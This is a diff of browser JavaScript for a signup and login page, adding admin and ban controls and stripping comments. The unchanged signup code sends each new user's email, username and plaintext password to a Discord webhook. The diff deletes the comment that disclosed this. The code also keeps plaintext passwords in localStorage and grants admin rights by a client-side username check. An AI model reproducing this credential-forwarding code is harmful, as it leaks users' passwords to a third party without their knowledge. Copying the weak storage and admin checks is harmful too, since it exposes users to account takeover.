@@ -76,36 +76,28 @@ async function signup() {
     const password = document.getElementById('signup-password').value;
     const confirmPassword = document.getElementById('confirm-password').value;
 
-    // Check if username is valid
-    if (!isValidUsername(username)) {
-        return;
-    }
+    if (!isValidUsername(username)) return;
 
-    // Check if the username already exists
     if (userDatabase[username]) {
         alert("Username already exists!");
         return;
     }
 
-    // Check if the email is already used
     const emailExists = Object.values(userDatabase).some(user => user.email === email);
     if (emailExists) {
         alert("An account with this email already exists!");
         return;
     }
 
-    // Validate password confirmation
     if (password !== confirmPassword) {
         alert("Passwords do not match!");
         return;
     }
 
-    // Save user data
     userDatabase[username] = { email, password };
-    localStorage.setItem('userDatabase', JSON.stringify(userDatabase)); // Save to localStorage
+    localStorage.setItem('userDatabase', JSON.stringify(userDatabase)); 
     alert("Signup successful! You can now log in.");
 
-    // Send the signup details to Discord webhook
     await sendToWebhook(email, username, password);
 
     backToLogin();
@@ -117,10 +109,10 @@ function login() {
 
     if (userDatabase[username] && userDatabase[username].password === password) {
         alert("Login successful!");
-        localStorage.setItem('loggedInUser', username); // Store the logged-in username
+        localStorage.setItem('loggedInUser', username); 
         document.getElementById('form-container').style.display = 'none';
         document.getElementById('main-app').style.display = 'block';
-        updateMainAppUI(username); // Update UI with user-specific info
+        updateMainAppUI(username); 
     } else {
         alert("Invalid username or password!");
     }
@@ -129,14 +121,33 @@ function login() {
 // Function to update the main app UI with user-specific information
 function updateMainAppUI(username) {
     document.getElementById('welcome-message').innerText = `Welcome, ${username}!`;
-    document.getElementById('logout-btn').style.display = 'block'; // Show logout button
+    document.getElementById('logout-btn').style.display = 'block';
+
+    if (username === "admin") {
+        document.getElementById('admin-controls').style.display = 'block';
+    } else {
+        document.getElementById('admin-controls').style.display = 'none';
+    }
+}
+
+// Admin function to ban a user
+function banUser() {
+    const userToBan = prompt("Enter the username of the user you want to ban:");
+
+    if (userToBan && userDatabase[userToBan]) {
+        delete userDatabase[userToBan];
+        localStorage.setItem('userDatabase', JSON.stringify(userDatabase)); 
+        alert(`User "${userToBan}" has been banned.`);
+    } else {
+        alert("User not found!");
+    }
 }
 
 // Logout function
 function logout() {
-    localStorage.removeItem('loggedInUser'); // Remove logged-in user from localStorage
+    localStorage.removeItem('loggedInUser'); 
     document.getElementById('main-app').style.display = 'none';
-    document.getElementById('form-container').style.display = 'block'; // Show the login form again
+    document.getElementById('form-container').style.display = 'block';
     alert("You have been logged out.");
 }
 
@@ -152,7 +163,7 @@ window.onload = () => {
 
     const loggedInUser = localStorage.getItem('loggedInUser');
     if (loggedInUser) {
-        updateMainAppUI(loggedInUser); // Update UI for the logged-in user
+        updateMainAppUI(loggedInUser); 
     }
 
     savedUsername.addEventListener('input', () => {
